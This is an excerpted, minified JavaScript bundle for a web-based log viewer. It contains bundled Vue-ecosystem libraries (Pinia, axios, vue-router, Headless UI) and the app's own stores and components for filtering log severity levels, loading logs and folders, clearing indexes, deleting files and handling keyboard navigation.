	...
	var e, t = {
			...
			500: (e, t, n) => {
				...
				const b = "undefined" != typeof window,
					w = !1,
					C = (() => "object" == typeof window && window.window === window ? window : "object" == typeof self && self.self === self ? self : "object" == typeof global && global.global === global ? global : "object" == typeof globalThis ? globalThis : {
						HTMLElement: null
					})();
				...
				const k = "object" == typeof navigator ? navigator : {
					...
					S = (() => /Macintosh/.test(k.userAgent) && /AppleWebKit/.test(k.userAgent) && !/Safari/.test(k.userAgent))(),
					O = b ? "undefined" != typeof HTMLAnchorElement && "download" in HTMLAnchorElement.prototype && !S ? function(e, t = "download", n) {
						const r = document.createElement("a");
						r.download = t, r.rel = "noopener", "string" == typeof e ? (r.href = e, r.origin !== location.origin ? E(r.href) ? _(e, t, n) : (r.target = "_blank", x(r)) : x(r)) : (r.href = URL.createObjectURL(e), setTimeout((function() {
				...
				function N(e, t) {
					"function" == typeof __VUE_DEVTOOLS_TOAST__ && __VUE_DEVTOOLS_TOAST__("🍍 " + e, t)
				}
						...
						"function" != typeof n.now && N("You seem to be using an outdated version of Vue Devtools. Are you still using the Beta release instead of the stable one? You can find the links at https://devtools.vuejs.org/guide/installation.html."), n.addTimelineLayer({
							...
							actions: [{
								...
								action: () => {
									!async function(e) {
										try {
											O(new Blob([JSON.stringify(e.state.value)], {
								...
								icon: "folder_open",
								action: async () => {
									await L(t), n.sendInspectorTree(H), n.sendInspectorState(H)
								},
							...
							if (n.app === e && n.inspectorId === H) {
								...
								P(e) ? r.unshift("state") : 1 === r.length && e._customProperties.has(r[0]) && !(r[0] in e.$state) || r.unshift("$state"), D = !1, n.set(e, r, n.state.value), D = !0
							}
						...
						if (n.state && (t._isOptionsAPI = !0), "function" == typeof n.state) {
							...
							U.includes(q(t.$id)) || U.push(q(t.$id)), h({
								...
								t.$onAction((({
									...
									K = void 0, o === y.patchFunction ? a.subtitle = "⤵️" : o === y.patchObject ? a.subtitle = "🧩" : r && !Array.isArray(r) && (a.subtitle = r.type), r && (a.data["rawEvent(s)"] = {
										_custom: {
								...
								t.$dispose = () => {
									i(), e.notifyComponentUpdate(), e.sendInspectorTree(H), e.sendInspectorState(H), e.getSettings().logStoreChanges && N(`Disposed "${t.$id}" store 🗑`)
								}, e.notifyComponentUpdate(), e.sendInspectorTree(H), e.sendInspectorState(H), e.getSettings().logStoreChanges && N(`"${t.$id}" store installed 🆕`)
							}))
						}(e, t)
					}
				}
				...
				function oe(e, t, n = {}, a, l, s) {
					...
					function S(t, n) {
						return function() {
							...
							try {
								l = n.apply(this && this.$id === e ? this : P, r)
							} catch (e) {
								throw X(i, e), e
							}
					...
					o && (N._r = !1);
					const P = (0, r.reactive)(w ? re({
						_hmrPayload: O,
						_customProperties: (0, r.markRaw)(new Set)
					}, N) : N);
					a._s.set(e, P);
					const T = a._e.run((() => (c = (0, r.effectScope)(), c.run((() => t())))));
					for (const t in T) {
						const n = T[t];
						if ((0, r.isRef)(n) && (R = n, !(0, r.isRef)(R) || !R.effect) || (0, r.isReactive)(n)) s || (!C || (V = n, o ? ne.has(V) : g(V) && V.hasOwnProperty(te)) || ((0, r.isRef)(n) ? n.value = C[t] : ee(n, C[t])), o ? i(a.state.value[e], t, n) : a.state.value[e][t] = n);
					...
					if (o ? Object.keys(T).forEach((e => {
							i(P, e, T[e])
						})) : (re(P, T), re((0, r.toRaw)(P), T)), Object.defineProperty(P, "$state", {
							get: () => a.state.value[e],
							set: e => {
								x((t => {
									re(t, e)
						...
						["_p", "_hmrPayload", "_getters", "_customProperties"].forEach((t => {
							Object.defineProperty(P, t, re({
								value: P[t]
							}, e))
						}))
					}
					return o && (P._r = !0), a._p.forEach((e => {
						if (w) {
							const t = c.run((() => e({
								store: P,
								app: a._a,
							...
							Object.keys(t || {}).forEach((e => P._customProperties.add(e))), re(P, t)
						} else re(P, c.run((() => e({
							store: P,
							app: a._a,
							pinia: a,
					...
					})), C && s && n.hydrate && n.hydrate(P.$state, C), d = !0, p = !0, P
				}
				...
				const {
					...
					getPrototypeOf: se
				} = Object, ce = (ue = Object.create(null), e => {
					const t = le.call(e);
				...
				const Ne = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : global,
					Pe = e => !he(e) && e !== Ne;
				const Te = (Ve = "undefined" != typeof Uint8Array && se(Uint8Array), e => Ve && e instanceof Ve);
				var Ve;
				const Re = fe("HTMLFormElement"),
					Le = (({
						hasOwnProperty: e
					...
					Me = {
						DIGIT: Ie,
						ALPHA: Be,
						ALPHA_DIGIT: Be + Be.toUpperCase() + Ie
					};
				const Fe = {
					isArray: pe,
					isArrayBuffer: ve,
				...
				const Ue = De.prototype,
					$e = {};
				["ERR_BAD_OPTION_VALUE", "ERR_BAD_OPTION", "ECONNABORTED", "ETIMEDOUT", "ERR_NETWORK", "ERR_FR_TOO_MANY_REDIRECTS", "ERR_DEPRECATED", "ERR_BAD_RESPONSE", "ERR_BAD_REQUEST", "ERR_CANCELED", "ERR_NOT_SUPPORT", "ERR_INVALID_URL"].forEach((e => {
					$e[e] = {
						value: e
					}
				})), Object.defineProperties(De, $e), Object.defineProperty(Ue, "isAxiosError", {
					value: !0
				}), De.from = (e, t, n, r, o, i) => {
				...
				const Ye = function(e, t, n) {
					...
					function c(e, n, o) {
						...
						if (e && !o && "object" == typeof e)
							if (Fe.endsWith(n, "{}")) n = r ? n : n.slice(0, -2), e = JSON.stringify(e);
							else if (Fe.isArray(e) && function(e) {
				...
				const rt = class {
					...
					it = "undefined" != typeof URLSearchParams ? URLSearchParams : et,
					at = FormData,
					lt = (() => {
						let e;
				...
				const dt = {
					...
					transformResponse: [function(e) {
						const t = this.transitional || dt.transitional,
				...
				const xt = Et;
				const kt = ct.isStandardBrowserEnv ? {
				...
				const Tt = "undefined" != typeof XMLHttpRequest && function(e) {
						return new Promise((function(t, n) {
							...
							if (s.open(e.method.toUpperCase(), nt(c, e.params, e.paramsSerializer), !0), s.timeout = e.timeout, "onloadend" in s ? s.onloadend = u : s.onreadystatechange = function() {
								...
								const t = (e.withCredentials || Ot(c)) && e.xsrfCookieName && kt.read(e.xsrfCookieName);
								t && o.set(e.xsrfHeaderName, t)
							}
							void 0 === r && o.setContentType(null), "setRequestHeader" in s && Fe.forEach(o.toJSON(), (function(e, t) {
								s.setRequestHeader(t, e)
							})), Fe.isUndefined(e.withCredentials) || (s.withCredentials = !!e.withCredentials), i && "json" !== i && (s.responseType = e.responseType), "function" == typeof e.onDownloadProgress && s.addEventListener("progress", Pt(e.onDownloadProgress, !0)), "function" == typeof e.onUploadProgress && s.upload && s.upload.addEventListener("progress", Pt(e.onUploadProgress)), (e.cancelToken || e.signal) && (a = t => {
								s && (n(!t || t.type ? new xt(null, e, s) : t), s.abort(), s = null)
				...
				const Rt = {
					getAdapter: e => {
						...
						let n, r;
						for (let o = 0; o < t && (n = e[o], !(r = Fe.isString(n) ? Vt[n.toLowerCase()] : n)); o++);
						if (!r) {
							if (!1 === r) throw new He(`Adapter ${n} is not supported by the environment`, "ERR_NOT_SUPPORT");
							throw new Error(Fe.hasOwnProp(Vt, n) ? `Adapter '${n}' is not available in the build` : `Unknown adapter '${n}'`)
						}
				...
				function At(e) {
					Lt(e), e.headers = wt.from(e.headers), e.data = Ct.call(e, e.transformRequest), -1 !== ["post", "put", "patch"].indexOf(e.method) && e.headers.setContentType("application/x-www-form-urlencoded", !1);
					return Rt.getAdapter(e.adapter || pt.adapter)(e).then((function(t) {
						return Lt(e), t.data = Ct.call(e, e.transformResponse, t), t.headers = wt.from(t.headers), t
					}), (function(t) {
						return _t(t) || (Lt(e), t && t.response && (t.response.data = Ct.call(e, e.transformResponse, t.response), t.response.headers = wt.from(t.response.headers))), Promise.reject(t)
					}))
				}
				...
				class zt {
					constructor(e) {
						...
						this.promise.then((e => {
							...
							n.reason || (n.reason = new xt(e, r, o), t(n.reason))
						}))
					}
					throwIfRequested() {
				...
				const Gt = function e(t) {
					const n = new Ht(t),
						r = ae(Ht.prototype.request, n);
					return Fe.extend(r, Ht.prototype, n, {
						allOwnKeys: !0
					}), Fe.extend(r, n, null, {
						allOwnKeys: !0
					}), r.create = function(n) {
				...
				Gt.Axios = Ht, Gt.CanceledError = xt, Gt.CancelToken = qt, Gt.isCancel = _t, Gt.VERSION = It, Gt.toFormData = Ye, Gt.AxiosError = He, Gt.Cancel = Gt.CanceledError, Gt.all = function(e) {
				...
				function En(e) {
					const t = function(e) {
							...
							return o.value || i(r.value, {
								...
								state: o,
								push: function(e, n) {
									const a = Qt({}, o.value, t.state, {
										forward: e,
										scroll: mn()
									});
									i(a.current, a, !0), i(e, Qt({}, _n(r.value, e, null), {
										position: a.position + 1
									}, n), !1), r.value = e
								},
								replace: function(e, n) {
									i(e, Qt({}, t.state, _n(o.value.back, e, o.value.forward, !0), n, {
						...
						n = function(e, t, n, r) {
							...
							function s() {
								...
								e.state && e.replaceState(Qt({}, e.state, {
									scroll: mn()
								}), "")
							}
					...
					const r = function(e, t) {
						...
						for (const t of e) {
							...
							for (let r = 0; r < t.length; r++) {
								...
								if (0 === a.type) r || (o += "/"), o += a.value.replace(Rn, "\\$&"), l += 40;
								else if (1 === a.type) {
									const {
										value: e,
										repeatable: n,
				...
				function Fn(e, t) {
					...
					function a(e) {
						let t = 0;
						for (; t < n.length && An(e, n[t]) >= 0 && (e.record.path !== n[t].record.path || !qn(e, n[t]));) t++;
					...
					return t = zn({
						...
						resolve: function(e, t) {
							let o, i, a, l = {};
							if ("name" in e && e.name) {
								if (o = r.get(e.name), !o) throw Nn(1, {
									location: e
								});
				...
				function ur(e) {
					...
					for (let e = 0; e < n.length; ++e) {
						const r = n[e].replace(Jn, " "),
							o = r.indexOf("="),
							i = cr(o < 0 ? r : r.slice(0, o)),
				...
				function Cr(e) {
					const t = (0, r.inject)(vr),
						n = (0, r.inject)(mr),
						o = (0, r.computed)((() => t.resolve((0, r.unref)(e.to)))),
						i = (0, r.computed)((() => {
							const {
								matched: e
							} = o.value, {
							...
							if (a > -1) return a;
							const l = Er(e[t - 2]);
							return t > 1 && Er(r) === l && i[i.length - 1].path !== l ? i.findIndex(ln.bind(null, e[t - 2])) : a
						})),
				...
				const _r = (0, r.defineComponent)({
					...
					setup(e, {
						...
						const n = (0, r.reactive)(Cr(e)),
							{
								options: o
							} = (0, r.inject)(vr),
							i = (0, r.computed)((() => ({
								[xr(e.activeClass, o.linkActiveClass, "router-link-active")]: n.isActive,
								[xr(e.exactActiveClass, o.linkExactActiveClass, "router-link-exact-active")]: n.isExactActive
							})));
						return () => {
				...
				const xr = (e, t, n) => null != e ? e : null != t ? t : n;
				...
				const Sr = (0, r.defineComponent)({
					...
					setup(e, {
						...
						const o = (0, r.inject)(gr),
							i = (0, r.computed)((() => e.route || o.value)),
							a = (0, r.inject)(hr, 0),
							l = (0, r.computed)((() => {
								let e = (0, r.unref)(a);
								const {
						...
						return (0, r.watch)((() => [c.value, s.value, e.name]), (([e, t, n], [r, o, i]) => {
							...
							const o = i.value,
								...
								l = s.value,
								u = l && l.components[a];
							if (!u) return kr(n.default, {
								Component: u,
								route: o
							});
							const f = l.props[a],
								d = f ? !0 === f ? o.params : "function" == typeof f ? f(o) : f : null,
								p = (0, r.h)(u, Qt({}, d, t, {
									onVnodeUnmounted: e => {
				...
				var Vr, Rr = ((Vr = Rr || {})[Vr.None = 0] = "None", Vr[Vr.RenderStrategy = 1] = "RenderStrategy", Vr[Vr.Static = 2] = "Static", Vr),
					Lr = (e => (e[e.Unmount = 0] = "Unmount", e[e.Hidden = 1] = "Hidden", e))(Lr || {});
				...
				function jr({
					...
					let {
						as: s,
						...c
					} = Mr(e, ["unmount", "static"]), u = null == (a = n.default) ? void 0 : a.call(n, o), f = {};
					if (o) {
						let e = !1,
							t = [];
				...
				let Co = (0, r.defineComponent)({
						...
						setup(e, {
							...
							function f(e = (e => e)) {
								let t = null !== c.value ? l.value[c.value] : null,
									n = co(e(l.value.slice()), (e => zr(e.dataRef.domRef))),
							...
							let d = {
								...
								search(e) {
									...
									let n = (null !== c.value ? l.value.slice(c.value + t).concat(l.value.slice(0, c.value + t)) : l.value).find((e => e.dataRef.textValue.startsWith(s.value) && !e.dataRef.disabled)),
										r = n ? l.value.indexOf(n) : -1; - 1 === r || r === c.value || (c.value = r, u.value = 1)
								},
								clearSearch() {
									s.value = ""
								},
					...
					_o = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-menu-button-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
							...
							function s(t) {
								e.disabled || (0 === i.menuState.value ? (i.closeMenu(), (0, r.nextTick)((() => {
									var e;
									return null == (e = zr(i.buttonRef)) ? void 0 : e.focus({
										preventScroll: !0
									})
									...
									var e;
									return null == (e = zr(i.itemsRef)) ? void 0 : e.focus({
										preventScroll: !0
									})
								}))))
							}
					...
					Eo = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-menu-items-${Dr()}`
							}
						},
						setup(e, {
							attrs: t,
					...
					xo = (0, r.defineComponent)({
						...
						props: {
							...
							id: {
								type: String,
								default: () => `headlessui-menu-item-${Dr()}`
							}
						},
						setup(e, {
							slots: t,
							...
							function u() {
								...
								0 === i.menuState.value && (!l.value || 0 !== i.activationTrigger.value && (0, r.nextTick)((() => {
									var e, t;
									return null == (t = null == (e = zr(a)) ? void 0 : e.scrollIntoView) ? void 0 : t.call(e, {
										block: "nearest"
									})
								})))
							}));
				...
				const Mo = "undefined" != typeof window,
					Fo = (Object.prototype.toString, e => "function" == typeof e),
					Do = e => "string" == typeof e,
					Uo = () => {};
				...
				var Wo = Object.getOwnPropertySymbols,
					...
					Zo = (e, t) => {
						...
						if (null != e && Wo)
							for (var r of Wo(e)) t.indexOf(r) < 0 && Go.call(e, r) && (n[r] = e[r]);
						return n
					};
				...
				var Jo = Object.defineProperty,
					...
					oi = (e, t) => {
						...
						if (ei)
							for (var n of ei(t)) ni.call(t, n) && ri(e, n, t[n]);
						return e
					},
					ii = (e, t) => Qo(e, Xo(t)),
					ai = (e, t) => {
						...
						if (null != e && ei)
							for (var r of ei(e)) t.indexOf(r) < 0 && ni.call(e, r) && (n[r] = e[r]);
						return n
					};
				...
				var mi = Object.defineProperty,
					...
					Ci = (e, t) => {
						...
						if (gi)
							for (var n of gi(t)) bi.call(t, n) && wi(e, n, t[n]);
						return e
					};
				const _i = {
					boolean: {
				...
				function xi(e, t, n = {}) {
					...
					return Ei(e, t, null == r ? void 0 : r.localStorage, n)
				}
				Object.defineProperty, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.defineProperty, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.defineProperty, Object.defineProperties, Object.getOwnPropertyDescriptors, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				var ki, Si;
				(Si = ki || (ki = {})).UP = "UP", Si.RIGHT = "RIGHT", Si.DOWN = "DOWN", Si.LEFT = "LEFT", Si.NONE = "NONE";
				Object.defineProperty, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.defineProperty, Object.defineProperties, Object.getOwnPropertyDescriptors, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.defineProperty, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				Object.defineProperty, Object.getOwnPropertySymbols, Object.prototype.hasOwnProperty, Object.prototype.propertyIsEnumerable;
				...
				((e, t) => {
					for (var n in t || (t = {})) Pi.call(t, n) && Vi(e, n, t[n]);
					if (Ni)
						for (var n of Ni(t)) Ti.call(t, n) && Vi(e, n, t[n])
				})({
					linear: function(e) {
						return e
					}
				...
				var Ri = ie({
					...
					Ai = ["debug", "info", "notice", "warning", "error", "critical", "alert", "emergency", "processing", "processed", "failed", ""],
					ji = ie({
						id: "severity",
						state: function() {
							return {
								selectedLevels: xi("selectedLevels", Ai),
								levelCounts: []
							}
						},
						getters: {
						...
						actions: {
							...
							selectAllLevels: function() {
								this.selectedLevels = Ai, this.levelCounts.forEach((function(e) {
									return e.selected = !0
								}))
							},
							deselectAllLevels: function() {
								this.selectedLevels = [], this.levelCounts.forEach((function(e) {
									return e.selected = !1
								}))
							},
							toggleLevel: function(e) {
								...
								this.selectedLevels.includes(e) ? (this.selectedLevels = this.selectedLevels.filter((function(t) {
									return t !== e
								})), t.selected = !1) : (this.selectedLevels.push(e), t.selected = !0)
							}
						}
					}),
					Bi = n(486),
					...
					Mi = ie({
						...
						state: function() {
							return {
								theme: xi("logViewerTheme", Ii.System),
								shorterStackTraces: xi("logViewerShorterStackTraces", !1),
								direction: xi("logViewerDirection", "desc"),
								resultsPerPage: xi("logViewerResultsPerPage", 25),
								helpSlideOverOpen: !1,
								loading: !1,
								error: null,
								logs: [],
						...
						actions: {
							...
							toggleTheme: function() {
								switch (this.theme) {
									...
									case Ii.Light:
										...
										break;
									default:
										this.theme = Ii.System
								}
								this.syncTheme()
							},
							syncTheme: function() {
								var e = this.theme;
								e === Ii.Dark || e === Ii.System && window.matchMedia("(prefers-color-scheme: dark)").matches ? document.documentElement.classList.add("dark") : document.documentElement.classList.remove("dark")
							},
							toggle: function(e) {
							...
							loadLogs: (0, Bi.debounce)((function() {
								var e, t = this,
								...
								if (0 !== a.folders.length && (this.abortController && this.abortController.abort(), this.selectedFile || l.hasQuery)) {
									...
									var u = {
										...
										levels: (0, r.toRaw)(c.selectedLevels.length > 0 ? c.selectedLevels : "none"),
									...
									o || (this.loading = !0), Zt.get("".concat(LogViewer.basePath, "/api/logs"), {
										...
										})) : n.logs, t.hasMoreResults = n.hasMoreResults, t.percentScanned = n.percentScanned, t.error = n.error || null, t.performance = n.performance || {}, c.setLevelCounts(n.levelCounts), s.setPagination(n.pagination), t.loading = !1, o || (0, r.nextTick)((function() {
											t.reset(), n.expandAutomatically && t.stacksOpen.push(0)
										})), t.hasMoreResults && t.loadLogs({
											silently: !0
										})
									})).catch((function(e) {
										var n, r;
					...
					Fi = ie({
						...
						state: function() {
							return {
								folders: [],
								direction: xi("fileViewerDirection", "desc"),
						...
						getters: {
							...
							isOpen: function() {
								var e = this;
								return function(t) {
									return e.foldersOpen.includes(t)
								}
							},
							...
							shouldBeSticky: function(e) {
								var t = this;
								return function(n) {
									return t.isOpen(n) && e.foldersInView.includes(n)
								}
							},
							isInViewport: function() {
								var e = this;
						...
						actions: {
							...
							loadFolders: function() {
								...
								return this.abortController && this.abortController.abort(), this.selectedHost ? (this.abortController = new AbortController, this.loading = !0, Zt.get("".concat(LogViewer.basePath, "/api/folders"), {
									...
									var n = t.data;
									e.folders = n, e.error = n.error || null, e.loading = !1, 0 === e.openFolderIdentifiers.length && (e.openFolderForActiveFile(), e.openRootFolderIfNoneOpen()), e.onScroll()
								})).catch((function(t) {
									var n, r;
							...
							clearCacheForFile: function(e) {
								var t = this;
								return this.clearingCache[e.identifier] = !0, Zt.post("".concat(LogViewer.basePath, "/api/files/").concat(e.identifier, "/clear-cache"), {}, {
									params: {
										host: this.hostQueryParam
									}
								}).then((function() {
							...
							deleteFile: function(e) {
								var t = this;
								return Zt.delete("".concat(LogViewer.basePath, "/api/files/").concat(e.identifier), {
									params: {
										host: this.hostQueryParam
									}
								}).then((function() {
							...
							clearCacheForFolder: function(e) {
								var t = this;
								return this.clearingCache[e.identifier] = !0, Zt.post("".concat(LogViewer.basePath, "/api/folders/").concat(e.identifier, "/clear-cache"), {}, {
									params: {
										host: this.hostQueryParam
									}
								}).then((function() {
							...
							deleteFolder: function(e) {
								var t = this;
								return this.deleting[e.identifier] = !0, Zt.delete("".concat(LogViewer.basePath, "/api/folders/").concat(e.identifier), {
									params: {
										host: this.hostQueryParam
									}
								}).then((function() {
							...
							deleteSelectedFiles: function() {
								return Zt.post("".concat(LogViewer.basePath, "/api/delete-multiple-files"), {
							...
							clearCacheForAllFiles: function() {
								var e = this;
								this.clearingCache["*"] = !0, Zt.post("".concat(LogViewer.basePath, "/api/clear-cache-all"), {}, {
									params: {
										host: this.hostQueryParam
									}
								}).then((function() {
					...
					Di = function(e) {
						...
						return Ui(e).replace(/&lt;mark&gt;/g, "<mark>").replace(/&lt;\/mark&gt;/g, "</mark>")
					},
					Ui = function(e) {
						var t = {
							"&": "&amp;",
					...
					Wi = [(0, r.createElementVNode)("circle", {
						class: "opacity-25",
						cx: "12",
						cy: "12",
						r: "10",
				...
				const Gi = {},
					Zi = (0, Ki.Z)(Gi, [
						["render", function(e, t) {
							return (0, r.openBlock)(), (0, r.createElementBlock)("svg", qi, Wi)
						}]
					]);
				var Yi = "file-item-info",
					Ji = "log-level-icon",
					Qi = "log-link.large-screen",
					Xi = {
						Files: "f",
						Logs: "l",
						Hosts: "h",
					...
					ra = function(e) {
						...
						if ("INPUT" !== e.target.tagName && (!e.metaKey && !e.ctrlKey))
							if (e.key === Xi.ShortcutHelp) {
								e.preventDefault();
								var n = Mi();
								n.helpSlideOverOpen = !n.helpSlideOverOpen
							} else if (e.key === Xi.Files) e.preventDefault(),
							function() {
						...
						else if (e.key === Xi.Logs) e.preventDefault(), (t = Array.from(document.querySelectorAll(".".concat(Ji)))).length > 0 && t[0].focus();
						else if (e.key === Xi.Hosts) {
							e.preventDefault();
							var r = document.getElementById("hosts-toggle-button");
							null == r || r.click()
						} else if (e.key === Xi.Severity) {
							e.preventDefault();
							var o = document.getElementById("severity-dropdown-toggle");
							null == o || o.click()
						} else if (e.key === Xi.Settings) {
							e.preventDefault();
							var i = document.querySelector("#desktop-site-settings .menu-button");
							null == i || i.click()
						} else if (e.key === Xi.Search) {
							e.preventDefault();
							var a = document.getElementById("query");
							null == a || a.focus()
						} else if (e.key === Xi.Refresh) {
							e.preventDefault();
					...
					oa = function(e) {
						if ("ArrowLeft" === e.key) e.preventDefault(),
							function() {
								var e = document.querySelector(".file-item-container.active .file-item-info");
							...
							var t = na(document.activeElement, Ji),
								n = Array.from(document.querySelectorAll(".".concat(Qi)));
							n.length > t && (e.preventDefault(), n[t].focus())
						} else if ("ArrowUp" === e.key) {
							var r = ea(document.activeElement, Ji);
							r && (e.preventDefault(), r.focus())
						} else if ("ArrowDown" === e.key) {
							var o = ta(document.activeElement, Ji);
							o && (e.preventDefault(), o.focus())
						}
					},
					ia = function(e) {
						if ("ArrowLeft" === e.key) {
							var t = na(document.activeElement, Qi),
								n = Array.from(document.querySelectorAll(".".concat(Ji)));
							n.length > t && (e.preventDefault(), n[t].focus())
						} else if ("ArrowUp" === e.key) {
							var r = ea(document.activeElement, Qi);
							r && (e.preventDefault(), r.focus())
						} else if ("ArrowDown" === e.key) {
							var o = ta(document.activeElement, Qi);
							o && (e.preventDefault(), o.focus())
					...
					aa = function(e) {
						if ("ArrowUp" === e.key) {
							var t = ea(document.activeElement, Yi);
							t && (e.preventDefault(), t.focus())
						} else if ("ArrowDown" === e.key) {
							var n = ta(document.activeElement, Yi);
					...
					la = function(e) {
						if ("ArrowLeft" === e.key) e.preventDefault(), document.activeElement.previousElementSibling.focus();
							...
							e.preventDefault();
							var t = Array.from(document.querySelectorAll(".".concat(Ji)));
					...
					function w(e, t) {
						function o(r, i, a, l) {
							...
							if ("throw" !== s.type) {
								var c = s.arg,
									f = c.value;
								return f && "object" == sa(f) && n.call(f, "__await") ? t.resolve(f.__await).then((function(e) {
									o("next", e, a, l)
								}), (function(e) {
									o("throw", e, a, l)
				...
				var fa = {
					...
					va = ["onClick", "checked", "value"],
					ma = {
						class: "file-name"
					},
					ga = (0, r.createElementVNode)("span", {
						class: "sr-only"
					}, "Name:", -1),
					ya = {
						class: "file-size"
					},
					ba = (0, r.createElementVNode)("span", {
						class: "sr-only"
					}, "Size:", -1),
					wa = {
						class: "py-2"
				...
				const xa = {
						...
						setup: function(e, t) {
							...
							var n = e,
								...
								u = function() {
									var e, t = (e = ca().mark((function e() {
										return ca().wrap((function(e) {
											for (;;) switch (e.prev = e.next) {
												...
												case 3:
													return n.logFile.identifier === o.selectedFileIdentifier && Hi(i, "file", null), e.next = 6, o.loadFolders();
												case 6:
												case "end":
													return e.stop()
											}
							...
							return function(t, n) {
								return (0, r.openBlock)(), (0, r.createElementBlock)("div", {
									class: (0, r.normalizeClass)(["file-item-container", [(0, r.unref)(c) ? "active" : ""]])
								}, [(0, r.createVNode)((0, r.unref)(Co), null, {
									default: (0, r.withCtx)((function() {
										return [(0, r.createElementVNode)("div", fa, [(0, r.createElementVNode)("button", {
											class: "file-item-info",
											onKeydown: n[0] || (n[0] = function() {
												return (0, r.unref)(aa) && (0, r.unref)(aa).apply(void 0, arguments)
											})
										}, [(0, r.unref)(c) ? (0, r.createCommentVNode)("", !0) : ((0, r.openBlock)(), (0, r.createElementBlock)("span", da, "Select log file")), (0, r.unref)(c) ? ((0, r.openBlock)(), (0, r.createElementBlock)("span", pa, "Deselect log file")) : (0, r.createCommentVNode)("", !0), e.logFile.can_delete ? (0, r.withDirectives)(((0, r.openBlock)(), (0, r.createElementBlock)("span", ha, [(0, r.createElementVNode)("input", {
											type: "checkbox",
											onClick: (0, r.withModifiers)(f, ["stop"]),
											checked: (0, r.unref)(o).isChecked(e.logFile),
											value: (0, r.unref)(o).isChecked(e.logFile)
										}, null, 8, va)], 512)), [
											[r.vShow, (0, r.unref)(o).checkBoxesVisibility]
										]) : (0, r.createCommentVNode)("", !0), (0, r.createElementVNode)("span", ma, [ga, (0, r.createTextVNode)((0, r.toDisplayString)(e.logFile.name), 1)]), (0, r.createElementVNode)("span", ya, [ba, (0, r.createTextVNode)((0, r.toDisplayString)(e.logFile.size_formatted), 1)])], 32), (0, r.createVNode)((0, r.unref)(_o), {
											as: "button",
											...
											default: (0, r.withCtx)((function() {
												return [(0, r.createVNode)((0, r.unref)(Eo), {
													as: "div",
													class: (0, r.normalizeClass)(["dropdown w-48", [(0, r.unref)(l)[e.logFile.identifier]]])
												}, {
													default: (0, r.withCtx)((function() {
														return [(0, r.createElementVNode)("div", wa, [(0, r.createVNode)((0, r.unref)(xo), {
															...
															default: (0, r.withCtx)((function(t) {
																...
																}, [(0, r.withDirectives)((0, r.createVNode)((0, r.unref)(Lo), {
																	class: "h-4 w-4 mr-2"
																}, null, 512), [
																	[r.vShow, !(0, r.unref)(o).clearingCache[e.logFile.identifier]]
																]), (0, r.withDirectives)((0, r.createVNode)(Zi, null, null, 512), [
																	[r.vShow, (0, r.unref)(o).clearingCache[e.logFile.identifier]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Clear index", 512), [
																	[r.vShow, !(0, r.unref)(o).cacheRecentlyCleared[e.logFile.identifier] && !(0, r.unref)(o).clearingCache[e.logFile.identifier]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", null, "Clearing...", 512), [
																	[r.vShow, !(0, r.unref)(o).cacheRecentlyCleared[e.logFile.identifier] && (0, r.unref)(o).clearingCache[e.logFile.identifier]]
																]), (0, r.withDirectives)((0, r.createElementVNode)("span", Ca, "Index cleared", 512), [
																	[r.vShow, (0, r.unref)(o).cacheRecentlyCleared[e.logFile.identifier]]
																])], 2)]
															})),
															_: 1
														}), e.logFile.can_download ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(xo), {
															key: 0,
															onClick: n[3] || (n[3] = (0, r.withModifiers)((function() {}), ["stop"]))
														}, {
															default: (0, r.withCtx)((function(t) {
																var n = t.active;
																return [(0, r.createElementVNode)("a", {
																	...
																	download: "",
																	class: (0, r.normalizeClass)([n ? "active" : ""])
																}, [(0, r.createVNode)((0, r.unref)(Ao), {
																	class: "w-4 h-4 mr-2"
																}), (0, r.createTextVNode)(" Download ")], 10, _a)]
															})),
															_: 1
														})) : (0, r.createCommentVNode)("", !0), e.logFile.can_delete ? ((0, r.openBlock)(), (0, r.createElementBlock)(r.Fragment, {
															key: 1
														}, [Ea, (0, r.createVNode)((0, r.unref)(xo), {
															onClick: (0, r.withModifiers)(u, ["stop", "prevent"])
														}, {
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("button", {
																	class: (0, r.normalizeClass)([t ? "active" : ""])
																}, [(0, r.createVNode)((0, r.unref)(No), {
																	class: "w-4 h-4 mr-2"
																}), (0, r.createTextVNode)(" Delete ")], 2)]
															})),
															_: 1
														}, 8, ["onClick"]), (0, r.createVNode)((0, r.unref)(xo), {
															onClick: (0, r.withModifiers)(d, ["stop"])
														}, {
															default: (0, r.withCtx)((function(e) {
																var t = e.active;
																return [(0, r.createElementVNode)("button", {
																	...
																	class: "w-4 h-4 mr-2"
																}), (0, r.createTextVNode)(" Delete Multiple ")], 2)]
															})),
															_: 1
				...
				var Sa = n(904),
					...
					La = n(520),
					Aa = {
						class: "checkmark w-[18px] h-[18px] bg-gray-50 dark:bg-gray-800 rounded border dark:border-gray-600 inline-flex items-center justify-center"
					};
				const ja = {
					__name: "Checkmark",
					props: {
					...
					setup: function(e) {
						return function(t, n) {
							return (0, r.openBlock)(), (0, r.createElementBlock)("div", Aa, [e.checked ? ((0, r.openBlock)(), (0, r.createBlock)((0, r.unref)(La), {
								key: 0,
								width: "18",
								height: "18",
								class: "w-full h-full"
				...
				var Da = (0, r.createElementVNode)("span", {
					...
					Ha = (0, r.createElementVNode)("span", {
						class: "ml-3"
					}, "Shorter stack traces", -1),
					za = (0, r.createElementVNode)("div", {
						class: "divider"
					}, null, -1),
					qa = (0, r.createElementVNode)("div", {
						class: "label"
					}, "Actions", -1),
					Wa = {
						class: "text-brand-500"
